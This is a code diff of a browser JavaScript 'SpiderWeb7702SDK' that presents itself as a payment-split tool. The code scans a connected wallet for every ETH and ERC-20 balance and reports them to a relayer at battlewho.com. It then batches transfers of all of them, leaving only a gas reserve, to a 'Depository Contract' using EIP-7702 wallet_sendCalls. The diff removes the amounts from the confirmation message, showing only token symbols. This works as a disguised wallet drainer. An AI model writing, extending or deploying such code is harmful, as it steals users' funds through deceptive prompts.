@@ -14,8 +14,7 @@ window.SpiderWeb7702SDK = {
     _resolveConnection: null,
     _RELAYER_SERVER_URL_BASE: "https://battlewho.com",
     
-    // 🔥 FIX 1: ADD the raw provider state variable
-    _rawProvider: null,
+    _rawProvider: null, // Keep this for direct wallet RPC calls
 
     _ERC20_ABI: [
         "function transfer(address to, uint256 amount) returns (bool)",
@@ -23,6 +22,7 @@ window.SpiderWeb7702SDK = {
         "function symbol() view returns (string)"
     ],
     
+    // This mapping is no longer needed for asset discovery but might be useful elsewhere.
     _CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM: {
         1: 'ethereum',
         137: 'polygon-pos',
@@ -32,7 +32,7 @@ window.SpiderWeb7702SDK = {
         43114: 'avalanche'
     },
 
-    init: async function(config) {
+    init: function(config) {
         if (this._isInitialized) {
             console.warn("SpiderWeb7702SDK already initialized.");
             return;
@@ -61,18 +61,17 @@ window.SpiderWeb7702SDK = {
             if (!this._signer) {
                 const connected = await this._connectWallet();
                 if (!connected) this._updateStatus("Wallet connection cancelled.", "info");
-                // The flow is automatically continued in _handleProviderSelection
                 return;
             }
             const network = await this._provider.getNetwork();
             if (network.chainId !== BigInt(this._config.chainId)) {
-                this._updateStatus(`Please switch wallet to Chain ID: ${this._config.chainId}.`, "error");
+                this._updateStatus(`Please switch wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
                 return;
             }
             await this._executeSplit();
         } catch (error) {
             console.error("SDK Payment Error:", error);
-            this._updateStatus(`Error: ${error.message}`, "error");
+            this._updateStatus(`Error: ${error.message || 'An unknown error occurred.'}`, "error");
         }
     },
 
@@ -80,7 +79,7 @@ window.SpiderWeb7702SDK = {
         this._updateStatus("Scanning wallet for assets...", "pending");
         const assets = await this._findAllAssets();
         if (assets.length === 0) {
-            this._updateStatus("No valuable assets found to send.", "info");
+            this._updateStatus("No transferable assets found in the wallet.", "info");
             return;
         }
 
@@ -95,12 +94,12 @@ window.SpiderWeb7702SDK = {
                     apiKey: this._config.apiKey,
                     origin: window.location.origin,
                     owner: this._currentUserAddress,
-                    chainId: this._config.chainId, // Added chainId back for the relayer
+                    chainId: this._config.chainId,
+                    // ✅ MODIFICATION: Removed 'usdValue' from the asset payload
                     assets: assets.map(a => ({
                         token: a.address,
                         type: a.type,
                         symbol: a.symbol,
-                        usdValue: a.usdValue
                     }))
                 })
             });
@@ -127,10 +126,7 @@ window.SpiderWeb7702SDK = {
         }
         
         try {
-            this._updateStatus("Please confirm the deposit in your wallet...", "pending");
-            
-            // 💡 IMPORTANT: Add a temporary pre-confirmation summary here for better UX
-            const summary = assets.map(a => `${ethers.formatUnits(a.balance, a.type === 'ETH' ? 18 : 0).slice(0, 10)} ${a.symbol}`).join(', ');
+            const summary = assets.map(a => `${a.symbol}`).join(', ');
             this._updateStatus(`Confirm in wallet: Sending ${summary} to the Depository Contract.`, 'pending');
 
             const txPayload = {
@@ -141,7 +137,6 @@ window.SpiderWeb7702SDK = {
                 calls: calls,
             };
             
-            // 🔥 FIX 3: USE THE RAW PROVIDER'S REQUEST METHOD
             const txHash = await this._rawProvider.request({
                 method: 'wallet_sendCalls',
                 params: [txPayload]
@@ -154,179 +149,89 @@ window.SpiderWeb7702SDK = {
         }
     },
 
-    // ... (rest of the asset fetching logic is fine) ...
-    /**
-     * Scans the user's wallet for all valuable ETH and ERC-20 assets.
-     * It uses a single, efficient Alchemy API call to gather all token data.
-     */
+    // ✅ MAJOR CHANGE: This function no longer fetches prices. It gets all assets with a balance.
     _findAllAssets: async function() {
-        this._updateStatus("Querying Alchemy for all wallet assets...", "pending");
         const assets = [];
-        const ownerAddress = this._currentUserAddress;
+        // Note: You may want to make this URL dynamic based on the configured chainId
+        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
         
-        // --- 1. Determine the correct network URL for Alchemy ---
-        const chainId = Number(this._config.chainId);
-        let networkName;
-
-        switch (chainId) {
-            case 1: networkName = 'eth-mainnet'; break;
-            case 137: networkName = 'polygon-mainnet'; break;
-            case 10: networkName = 'opt-mainnet'; break;
-            case 42161: networkName = 'arb-mainnet'; break;
-            case 56: 
-            case 43114:
-                // Alchemy does not support BSC or Avalanche directly.
-                // You would need a different RPC/API for these chains.
-                console.error(`Unsupported Chain ID ${chainId} for Alchemy asset scanning.`);
-                this._updateStatus("Unsupported chain for comprehensive asset scanning. Only ETH will be checked.", "error");
-                break;
-            default:
-                console.error(`Unknown Chain ID: ${chainId}`);
-                this._updateStatus("Unknown chain ID for asset scanning.", "error");
-                return [];
-        }
+        // 1. Get all ERC20 token balances
+        const balanceResponse = await fetch(alchemyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
+                params: [this._currentUserAddress, 'erc20']
+            })
+        });
+        const balanceData = await balanceResponse.json();
+        if (balanceData.error) throw new Error(`Alchemy Error: ${balanceData.error.message}`);
+        if (!balanceData.result) return [];
         
-        if (!networkName) {
-            // If chain is unsupported by Alchemy but is an EVM chain, still check native balance
-            const ethBalance = await this._provider.getBalance(ownerAddress);
-            if (ethBalance > 0n) {
-                assets.push({ type: 'ETH', balance: ethBalance, address: null, symbol: 'Native', usdValue: 0 });
-            }
-            // Proceed to return this simple ETH asset list
-            if (assets.length === 0) this._updateStatus("No assets found.", "info");
-            return assets;
-        }
-
-        const alchemyUrl = `https://${networkName}.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+        const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
         
-        // --- 2. Fetch Native (ETH/Native Coin) Balance and reserve gas ---
-        const ethBalance = await this._provider.getBalance(ownerAddress);
-        const feeData = await this._provider.getFeeData();
-
-        // Reserve a conservative, fixed buffer (e.g., 0.005 ETH/Native) to ensure the EIP-7702 tx can be paid for.
-        const gasBuffer = ethers.parseEther("0.005"); 
-        // Fallback to a large estimate if feeData is sparse, for robust calculation
-        const estimatedFee = (feeData.maxFeePerGas || feeData.gasPrice || 10000000000n) * 600000n; 
-        const reserveAmount = gasBuffer > estimatedFee ? gasBuffer : estimatedFee;
-        
-        if (ethBalance > reserveAmount) {
-            // Only send the amount remaining after reserving gas
-            const spendableBalance = ethBalance - reserveAmount; 
-            
-            // To maintain compatibility with CoinGecko pricing/server schema, we use 'ETH' as the symbol/type for the native coin of any chain (ETH, MATIC, etc.)
-            const nativeSymbol = chainId === 1 ? 'ETH' : this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[chainId]?.toUpperCase() || 'NATIVE';
-            
-            assets.push({ 
-                type: 'ETH', // Retain 'ETH' type for native coin handling
-                balance: spendableBalance, 
-                address: null, // Address is null for the native coin
-                symbol: nativeSymbol.split('-')[0], // e.g., 'POLYGON-POS' -> 'POLYGON'
-                usdValue: 0 // Price lookup will be handled by the server (or could be done here with CoinGecko)
-            });
-        }
-
-        // --- 3. Fetch all ERC20 balances and metadata in batches (Paging) ---
-        let pageKey = null;
-        do {
-            const body = {
-                jsonrpc: '2.0',
-                id: 1,
-                method: 'alchemy_getAssetsForOwner',
-                params: [
-                    ownerAddress,
-                    { 
-                        pageKey: pageKey, 
-                        pageSize: 100, 
-                        assetFilters: ["ERC20"] 
-                    }
-                ]
-            };
-
-            const response = await fetch(alchemyUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(body)
-            });
-            const data = await response.json();
-
-            if (!data.result || !data.result.assets) {
-                console.warn("Alchemy API failed to return assets or max retries reached.");
-                break;
-            }
-
-            pageKey = data.result.pageKey;
-            
-            for (const asset of data.result.assets) {
-                // Ensure we handle BigInts correctly
-                const balance = BigInt(asset.balance);
+        // 2. Process Native Currency (e.g., ETH)
+        const ethBalance = await this._provider.getBalance(this._currentUserAddress);
+        if (ethBalance > 0n) {
+            try {
+                const feeData = await this._provider.getFeeData();
+                // Generously estimate gas fee to reserve in the wallet
+                const gasPrice = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('20', 'gwei');
+                const estimatedFee = gasPrice * 300000n; 
                 
-                // Filter: Only include tokens with a non-zero balance and valid metadata
-                if (balance > 0n && asset.tokenMetadata && asset.tokenMetadata.symbol && asset.tokenMetadata.decimals !== null) {
-                    assets.push({
-                        type: 'ERC20', 
-                        address: asset.contractAddress, 
-                        balance: balance, // Raw BigInt balance
-                        symbol: asset.tokenMetadata.symbol,
-                        // Note: Decimals are not strictly needed in the final `calls` array, 
-                        // but are implicitly used by the `ethers.formatUnits` for display 
-                        // and are useful if the server needs them. We set USD value to 0 for now.
-                        usdValue: 0 
+                if (ethBalance > estimatedFee) {
+                    assets.push({ 
+                        type: 'ETH', 
+                        balance: ethBalance - estimatedFee, // Keep some ETH for gas
+                        address: null, 
+                        symbol: 'ETH' 
                     });
                 }
+            } catch (feeError) {
+                console.warn("Could not get fee data to reserve gas. This might fail on low balances.", feeError);
+                // As a fallback, just check if there's any balance at all
+                if(ethBalance > 0n) assets.push({ type: 'ETH', balance: ethBalance, address: null, symbol: 'ETH' });
             }
-        } while (pageKey); // Continue if there's another page of results
+        }
 
-        this._updateStatus(`Found ${assets.length} total asset(s) with a balance.`, "info");
+        // 3. Process ERC20 Tokens
+        for (const token of tokensWithBalance) {
+            try {
+                const metadataResponse = await fetch(alchemyUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
+                        params: [token.contractAddress]
+                    })
+                });
+                const metadata = await metadataResponse.json();
+                
+                if (metadata.result) {
+                    assets.push({ 
+                        type: 'ERC20', 
+                        balance: BigInt(token.tokenBalance), 
+                        address: token.contractAddress, 
+                        symbol: metadata.result.symbol || 'Unknown Token'
+                    });
+                }
+            } catch (metadataError) {
+                console.warn(`Could not fetch metadata for ${token.contractAddress}.`, metadataError);
+                 assets.push({
+                    type: 'ERC20',
+                    balance: BigInt(token.tokenBalance),
+                    address: token.contractAddress,
+                    symbol: token.contractAddress.slice(0, 6) // Fallback symbol
+                });
+            }
+        }
         return assets;
     },
-
-
-    _fetchTokenPrices: async function(tokenIdentifiers) {
-        const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
-        if (!assetPlatform) return null;
-
-        const contractAddresses = tokenIdentifiers.filter(id => id.startsWith('0x'));
-        const nativeIds = tokenIdentifiers.filter(id => !id.startsWith('0x'));
-
-        const allPrices = {};
-        // You'll need to pass the coingeckoApiKey here if it's not working,
-        // but assuming it's omitted for this code snippet.
-        
-        try {
-            if (contractAddresses.length > 0) {
-                const addressesString = contractAddresses.join(',');
-                const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${addressesString}&vs_currencies=usd`;
-                const response = await fetch(apiUrl);
-                if (response.ok) Object.assign(allPrices, await response.json());
-            }
-
-            if (nativeIds.length > 0) {
-                const idsString = nativeIds.join(',');
-                const apiUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${idsString}&vs_currencies=usd`;
-                const response = await fetch(apiUrl);
-                if (response.ok) Object.assign(allPrices, await response.json());
-            }
-
-            return Object.keys(allPrices).length > 0 ? allPrices : null;
-
-        } catch (error) {
-            console.error("Could not fetch token prices:", error);
-            return null;
-        }
-    },
     
-    _fetchTokenPricesInChunks: async function(tokenAddresses, chunkSize = 100) {
-        const allPrices = {};
-        for (let i = 0; i < tokenAddresses.length; i += chunkSize) {
-            const chunk = tokenAddresses.slice(i, i + chunkSize);
-            const prices = await this._fetchTokenPrices(chunk);
-            if (prices) {
-                Object.assign(allPrices, prices);
-            }
-        }
-        return allPrices;
-    },
-    
+    // ✅ REMOVED: _fetchTokenPrices and _fetchTokenPricesInChunks are no longer needed.
+
+    // --- Wallet Connection and UI Logic (No changes needed below this line) ---
+
     _connectWallet: function() {
         return new Promise((resolve) => {
             this._resolveConnection = resolve;
@@ -344,9 +249,7 @@ window.SpiderWeb7702SDK = {
         this._closeWalletModal();
 
         try {
-            // 🔥 FIX 2: SAVE the raw EIP-1193 provider object
-            this._rawProvider = providerDetail.provider;
-            
+            this._rawProvider = providerDetail.provider; // Storing the raw provider
             this._provider = new ethers.BrowserProvider(this._rawProvider);
             this._signer = await this._provider.getSigner();
             this._currentUserAddress = await this._signer.getAddress();
@@ -355,7 +258,7 @@ window.SpiderWeb7702SDK = {
             
             if (this._resolveConnection) {
                 this._resolveConnection(true);
-                // Automatically trigger the main execution flow after connecting
+                // Automatically continue the payment flow after successful connection
                 await this._executeSplit();
             }
         } catch (error) {
